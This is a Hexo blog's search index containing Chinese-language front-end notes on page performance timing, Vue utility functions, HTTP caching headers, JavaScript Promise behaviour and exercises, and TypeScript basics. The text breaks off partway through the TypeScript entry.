<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[性能优化]]></title>
      <url>https://fuzhongfeng.github.io/2022/06/12/performance/</url>
      <content type="html"><![CDATA[<h1 id="chrome-performance"><a href="#chrome-performance" class="headerlink" title="chrome performance"></a>chrome performance</h1><h2 id="performance-timing"><a href="#performance-timing" class="headerlink" title="performance.timing"></a>performance.timing</h2><p><img src="/images/timing.webp" alt="1"></p>
<h3 id="白屏"><a href="#白屏" class="headerlink" title="白屏"></a>白屏</h3><p>白屏时间 = 地址栏输入网址后回车 - 浏览器出现第一个元素<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 一般白屏结束时间定义为body渲染前，此script标签放在body前</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.whiteEnd = Date.now()</span><br><span class="line">    // 白屏时间</span><br><span class="line">    console.log(whiteEnd - performance.timing.navigationStart)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="判断网页内存溢出"><a href="#判断网页内存溢出" class="headerlink" title="判断网页内存溢出"></a>判断网页内存溢出</h2><p>问题：做课件撤销重做功能时，用两个数组存储页面的数据，上线一段时间后接到用户反馈页面崩溃的问题。初步猜测是内存溢出，那么如何验证是否为内存溢出呢？<br>验证方法：Chrome – More tools – Performance monitor – Js heap size<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 控制台手动模拟内存增加，查看 Js heap size 大小</span><br><span class="line">var arr = []</span><br><span class="line">for(let i = 0; i &lt; 100000000; i++) &#123;</span><br><span class="line">    arr.push(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> Performance </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Performance </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[vue源码阅读]]></title>
      <url>https://fuzhongfeng.github.io/2022/02/20/vue-sourcecode/</url>
      <content type="html"><![CDATA[<h1 id="vue源码阅读"><a href="#vue源码阅读" class="headerlink" title="vue源码阅读"></a>vue源码阅读</h1><h2 id="1-工具方法的学习"><a href="#1-工具方法的学习" class="headerlink" title="1. 工具方法的学习"></a>1. 工具方法的学习</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Create a cached version of a pure function.</span><br><span class="line"> * 缓存函数，限定参数为string的情况下</span><br><span class="line"> */</span><br><span class="line">export function cached&lt;F: Function&gt; (fn: F): F &#123;</span><br><span class="line">  const cache = Object.create(null)</span><br><span class="line">  return (function cachedFn (str: string) &#123;</span><br><span class="line">    const hit = cache[str]</span><br><span class="line">    return hit || (cache[str] = fn(str))</span><br><span class="line">  &#125;: any)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Camelize a hyphen-delimited string.</span><br><span class="line"> * 转换为大驼峰</span><br><span class="line"> */</span><br><span class="line">const camelizeRE = /-(\w)/g</span><br><span class="line">export const camelize = cached((str: string): string =&gt; &#123;</span><br><span class="line">  return str.replace(camelizeRE, (_, c) =&gt; c ? c.toUpperCase() : &apos;&apos;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Vue </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[http cache]]></title>
      <url>https://fuzhongfeng.github.io/2022/01/23/http-cache/</url>
      <content type="html"><![CDATA[<h1 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h1><hr>
<p>良好的缓存策略可以降低资源的重复加载提高网页的整体加载速度，通常浏览器缓存策略分为两种：强缓存和协商缓存</p>
<h2 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h2><blockquote>
<p>在<em>响应头</em>中添加 <code>Expires: Thu, 28 Dec 2019 05:27:45 GMT</code> 或 <code>Cache-Control: public, max-age=2592000</code> 来控制强缓存。</p>
<ul>
<li>Expires 是 HTTP/1.0 的字段，它规定了缓存过期的一个绝对时间，过期后需再次请求。缺点：Expires 使用的是客户端本机时间不准确，所以引入了 Cache-Control:max-age。</li>
<li>Cache-Control 是 HTTP/1.1 的字段，它规定了缓存过期的一个相对时间。优先级：Cache-Control &gt; Expires。常用指令如下：<br>public: 任意一方都能缓存该资源(客户端、代理服务器等)。<br>max-age(秒)：缓存的时长，也是响应的最大的Age值。<br>s-maxage(秒)：公共缓存服务器响应的最大Age值。<br>no-cache: 浏览器每次使用url的缓存版本之前都必须与服务器重新验证<br>no-store: 浏览器和其他中间缓存（如CDN）从不存储任何版本的文件<br>private: 浏览器可以缓存，但是中间缓存不能</li>
<li>强缓存阶段如果本地缓存没有过期的话不会向服务器发送请求，状态码为200 (from disk cache)或是200 OK (from memory cache)</li>
</ul>
</blockquote>
<h2 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h2><blockquote>
<p>强缓存未命中将进入协商缓存。在<em>请求头</em>中添加 <code>If-Modified-Since: Tue, 28 Nov 2019 05:14:02 GMT</code> 或 <code>If-None-Match: W/&quot;5a1cf09a-63c6&quot;</code> 开启协商缓存，协商缓存阶段每次都会向浏览器发起请求。</p>
<ul>
<li>If-Modified-Since 中携带的信息为该资源上次请求的响应头中的 Last-Modified 字段。If-None-Match 中携带的信息为该资源上次请求的响应头中的 ETag 字段。服务器通过这两个字段来判断资源是否有修改，如果有修改则返回状态码200和新的内容，如果没有修改返回状态码304。</li>
<li>Last-Modified 是 HTTP/1.0 的字段。在第一次请求改资源时把这个标识放到响应头传到客户端，标记此资源在服务器端最后被修改的时间。缺点：如果某个资源只是修改了，但实际内容并没有发生变化，Last-Modified 无法判断出来。</li>
<li>ETag 是 HTTP/1.1 的字段。服务器通过某种算法对资源生成一个唯一的标识。在第一次请求该资源时把这个标识放到响应头传到客户端。优先级：ETag &gt; Last-Modified</li>
</ul>
</blockquote>
<h2 id="最佳实践："><a href="#最佳实践：" class="headerlink" title="最佳实践："></a>最佳实践：</h2><ol>
<li>通过版本化 URL 确定的资源，如 html 中引用的 css、js、图片等资源文件，需要随时更新。</li>
</ol>
<ul>
<li>通过 webpack contentHash 生成资源地址</li>
<li>设置长时间使用强缓存：<code>Cache-Control: max-age=31536000</code></li>
</ul>
<ol start="2">
<li>不能通过版本化 URL 确定的资源，如 html 文件。（<code>https://xxx.com/index.2s19fg.html</code> 类似的地址显然是不合理的）</li>
</ol>
<ul>
<li>不使用强缓存：响应头设置 <code>Cache-Control: no-cache</code> 使用前与服务器重新验证</li>
<li>设置协商缓存：响应头设置 <code>ETag</code> 字段来验证过期缓存资源<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// nginx 配置</span><br><span class="line">location ~ .*\.(htm|html)$ &#123;</span><br><span class="line">    add_header Cache-Control no-cache;</span><br><span class="line">    add_header Pragma no-cache;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="设置及验证："><a href="#设置及验证：" class="headerlink" title="设置及验证："></a>设置及验证：</h2><p>这里给了一些 node express 服务器的配置、最佳实践方案、及验证方式：<a href="https://web.dev/codelab-http-cache" target="_blank" rel="noopener">https://web.dev/codelab-http-cache</a></p>
<h4 id="参考：https-web-dev-http-cache-examples"><a href="#参考：https-web-dev-http-cache-examples" class="headerlink" title="参考：https://web.dev/http-cache/#examples"></a>参考：<a href="https://web.dev/http-cache/#examples" target="_blank" rel="noopener">https://web.dev/http-cache/#examples</a></h4>]]></content>
      
        <categories>
            
            <category> Performance </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Performance </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>https://fuzhongfeng.github.io/2022/01/23/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript-Promise]]></title>
      <url>https://fuzhongfeng.github.io/2020/11/25/javascript-promise/</url>
      <content type="html"><![CDATA[<h1 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h1><h3 id="Promise-prototype-catch"><a href="#Promise-prototype-catch" class="headerlink" title="Promise.prototype.catch"></a>Promise.prototype.catch</h3><ol>
<li><p>可以捕获 Promise 参数函数和 then 内的错误</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">new Promise((r, j) =&gt; &#123;</span><br><span class="line">    throw new Error(&apos;err!!!&apos;)</span><br><span class="line">&#125;).then(() =&gt; &#123;</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;, e) // 触发</span><br><span class="line">&#125;)</span><br><span class="line">// catch Error: err!!!</span><br><span class="line"></span><br><span class="line">new Promise((r, j) =&gt; &#123;</span><br><span class="line">    r()</span><br><span class="line">&#125;).then(() =&gt; &#123;</span><br><span class="line">    throw new Error(&apos;err!!!&apos;)</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;, e) // 触发</span><br><span class="line">&#125;)</span><br><span class="line">// catch Error: err!!!</span><br></pre></td></tr></table></figure>
</li>
<li><p>不能捕获 Promise 参数函数和 then 内的任何异步函数的错误</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">new Promise((r, j) =&gt; &#123;</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">       throw new Error(&apos;err!!!&apos;)</span><br><span class="line">    &#125;, 3000)</span><br><span class="line">&#125;).then(() =&gt; &#123;</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;, e) // 不触发</span><br><span class="line">&#125;)</span><br><span class="line">// 无打印，没有捕获到错误</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果 then 没有 onReject 函数，则会触发catch。参数为reject传入的值或 throw 的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">new Promise((r, j) =&gt; &#123;</span><br><span class="line">    j(&apos;reject!!!&apos;)</span><br><span class="line">&#125;).then(() =&gt; &#123;</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;, e)</span><br><span class="line">&#125;)</span><br><span class="line">// catch reject!!!</span><br><span class="line"></span><br><span class="line">new Promise((r, j) =&gt; &#123;</span><br><span class="line">    j(&apos;reject!!!&apos;)</span><br><span class="line">&#125;).then(() =&gt; &#123;</span><br><span class="line">&#125;, (e) =&gt; &#123;</span><br><span class="line">  console.log(&apos;onReject&apos;, e)</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;, e) // 不会执行到</span><br><span class="line">&#125;)</span><br><span class="line">// onReject reject!!!</span><br><span class="line"></span><br><span class="line">new Promise((r, j) =&gt; &#123;</span><br><span class="line">    throw new Error(&apos;错了&apos;)</span><br><span class="line">&#125;).then(() =&gt; &#123;&#125;, (e) =&gt; &#123; </span><br><span class="line">    console.log(&apos;reject&apos;, e) // 执行</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;, e) // 不执行</span><br><span class="line">&#125;)</span><br><span class="line">// reject 错了</span><br></pre></td></tr></table></figure>
</li>
<li><p>resolve 后的 throw Error 会被忽略</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">new Promise(function(r, j) &#123;</span><br><span class="line">  r();</span><br><span class="line">  console.log(&apos;resolve after&apos;);</span><br><span class="line">  throw &apos;resolve 后 throw&apos;;</span><br><span class="line">&#125;).catch(function(e) &#123;</span><br><span class="line">   console.log(e); // 不会执行</span><br><span class="line">&#125;);</span><br><span class="line">// resolve after</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="源码实现"><a href="#源码实现" class="headerlink" title="源码实现"></a>源码实现</h3><p><a href="https://www.jianshu.com/p/43de678e918a" target="_blank" rel="noopener">https://www.jianshu.com/p/43de678e918a</a></p>
<h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><blockquote>
<p>练习1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">JS实现一个带并发限制的异步调度器Scheduler，保证同时运行的任务最多有两个。完善代码中Scheduler类，使得以下程序能正确输出</span><br><span class="line">class Scheduler &#123;</span><br><span class="line">  add(promiseCreator) &#123; ... &#125;</span><br><span class="line">  // ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const timeout = (time) =&gt; new Promise(resolve =&gt; &#123;</span><br><span class="line">  setTimeout(resolve, time)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">const scheduler = new Scheduler()</span><br><span class="line"></span><br><span class="line">const addTask = (time, order) =&gt; &#123;</span><br><span class="line">  scheduler.add(</span><br><span class="line">      () =&gt; timeout(time)</span><br><span class="line">  ).then(() =&gt; console.log(order))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addTask(1000, &apos;1&apos;)</span><br><span class="line">addTask(500, &apos;2&apos;)</span><br><span class="line">addTask(300, &apos;3&apos;)</span><br><span class="line">addTask(400, &apos;4&apos;)// output: 2 3 1 4</span><br><span class="line">// 一开始，1、2两个任务进入队列</span><br><span class="line">// 500ms时，2完成，输出2，任务3进队</span><br><span class="line">// 800ms时，3完成，输出3，任务4进队</span><br><span class="line">// 1000ms时，1完成，输出1</span><br><span class="line">// 1200ms时，4完成，输出4</span><br><span class="line"></span><br><span class="line">答案：</span><br><span class="line">class Scheduler &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.limit = 2</span><br><span class="line">    this.list = []</span><br><span class="line">    this.count = 0</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  add(promiseCreator) &#123;</span><br><span class="line">    return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">      this.list.push([promiseCreator, resolve]);</span><br><span class="line">      this.process();</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  process() &#123;</span><br><span class="line">    if (this.count &gt;= this.limit) return;</span><br><span class="line"></span><br><span class="line">    if (this.list.length &gt; 0) &#123;</span><br><span class="line">      var item = this.list.shift();</span><br><span class="line"></span><br><span class="line">      item[0]().then(() =&gt; &#123;</span><br><span class="line">        this.count--;</span><br><span class="line">        item[1]();</span><br><span class="line"></span><br><span class="line">        this.process()</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      this.count++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>练习2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">async function async1() &#123;</span><br><span class="line">  console.log(&apos;async1 start&apos;);</span><br><span class="line">  await async2();</span><br><span class="line">  console.log(&apos;async1 end&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function async2() &#123;</span><br><span class="line">  console.log(&apos;async2&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(&apos;script start&apos;);</span><br><span class="line"></span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">    console.log(&apos;setTimeout&apos;);</span><br><span class="line">&#125;, 0);  </span><br><span class="line"></span><br><span class="line">async1();</span><br><span class="line"></span><br><span class="line">new Promise(function(resolve) &#123;</span><br><span class="line">    console.log(&apos;promise1&apos;);</span><br><span class="line">    resolve();</span><br><span class="line">    console.log(&apos;promise1 resolve after&apos;)</span><br><span class="line">    reject()</span><br><span class="line">  &#125;).then(function() &#123;</span><br><span class="line">    console.log(&apos;promise2&apos;);</span><br><span class="line">&#125;).catch((e) =&gt; &#123;</span><br><span class="line">    console.log(&apos;catch&apos;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(&apos;script end&apos;);</span><br><span class="line"></span><br><span class="line">// script start</span><br><span class="line">// async1 start</span><br><span class="line">// async2</span><br><span class="line">// promise1</span><br><span class="line">// promise1 resolve after</span><br><span class="line">// script end</span><br><span class="line">// async1 end</span><br><span class="line">// promise2</span><br><span class="line">// setTimeout</span><br></pre></td></tr></table></figure></p>
</blockquote>
<h2 id="实现一个-Promise-all"><a href="#实现一个-Promise-all" class="headerlink" title="实现一个 Promise.all"></a>实现一个 Promise.all</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Promise.myAll = function(promiseArr) &#123;</span><br><span class="line">  return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">    var result = [];</span><br><span class="line">    var count = 0;</span><br><span class="line"></span><br><span class="line">    promiseArr.forEach((p, i) =&gt; &#123;</span><br><span class="line">      if (Object.prototype.toString.call(p) !== &apos;[object Promise]&apos;) &#123;</span><br><span class="line">        count++;</span><br><span class="line">        result[i] = p</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        p.then((d) =&gt; &#123;</span><br><span class="line">          count++;</span><br><span class="line">          result[i] = d</span><br><span class="line"></span><br><span class="line">          if (count === promiseArr.length) &#123;</span><br><span class="line">            resolve(result)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;).catch((e) =&gt; &#123;</span><br><span class="line">          reject(e)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var promise1 = Promise.resolve(3);</span><br><span class="line">var promise2 = 42;</span><br><span class="line">var promise3 = new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">  setTimeout(resolve, 5000, &apos;foo&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Promise.myAll([promise1, promise2, promise3]).then((data) =&gt; &#123;</span><br><span class="line">  console.log(data)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> JavaScript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Typescript]]></title>
      <url>https://fuzhongfeng.github.io/2020/09/25/typescript/</url>
      <content type="html"><![CDATA[<h1 id="Typescript"><a href="#Typescript" class="headerlink" title="Typescript"></a>Typescript</h1><h2 id="interface"><a href="#interface" class="headerlink" title="interface"></a>interface</h2><ol>
<li>接口的作用就是为类型命名和为你的码定义契约</li>
<li><p>可选属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interface SquareConfig &#123;</span><br><span class="line">  color?: string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>只读属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interface Point &#123;</span><br><span class="line">    readonly x: number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>类类型，强制类去实现接口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">interface ClockInterface &#123;</span><br><span class="line">    currentTime: Date;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Clock implements ClockInterface &#123;</span><br><span class="line">    currentTime: Date;</span><br><span class="line">    constructor() &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>class 可以通过 implements 实现 interface, interface 只检查类里的公共属性，静态和私有属性都不会检查</p>
</li>
</ol>
<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><ol>
<li>public修饰符，为默认值。</li>
<li><p>private 修饰符，不能在声明它的类的外部访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Animal &#123;</span><br><span class="line">    private name: string;</span><br><span class="line">    constructor(theName: string) &#123; this.name = theName; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new Animal(&quot;Cat&quot;).name; // 错误: &apos;name&apos; 是私有的</span><br></pre></td></tr></table></figure>
</li>
<li><p>protected 修饰符，protected成员在派生类中仍然可以访问。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>readonly修饰符, 只读属性必须在声明时或构造函数里被初始化。</p>
</li>
<li>抽象类，抽象类做为其它派生类的基类使用。 它们一般不会直接被实例化。 不同于接口，抽象类可以包含成员的实现细节。 abstract关键字是用于定义抽象类和在抽象类内部定义抽象方法。</li>
</ol>
<h2 id="ts里-type-和-interface-的区别"><a href="#ts里-type-和-interface-的区别" class="headerlink" title="ts里 type 和 interface 的区别"></a>ts里 type 和 interface 的区别</h2><h3 id="相同点："><a href="#相同点：" class="headerlink" title="相同点："></a>相同点：</h3><ul>
<li>都可以被 class implements 实现</li>
<li>都可以描述一个对象或者函数</li>
<li>都允许拓展（extends），可以相互 extends<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// interface extents interface</span><br><span class="line">interface Name &#123; </span><br><span class="line">  name: string; </span><br><span class="line">&#125;</span><br><span class="line">interface User extends Name &#123; </span><br><span class="line">  age: number; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// type extends 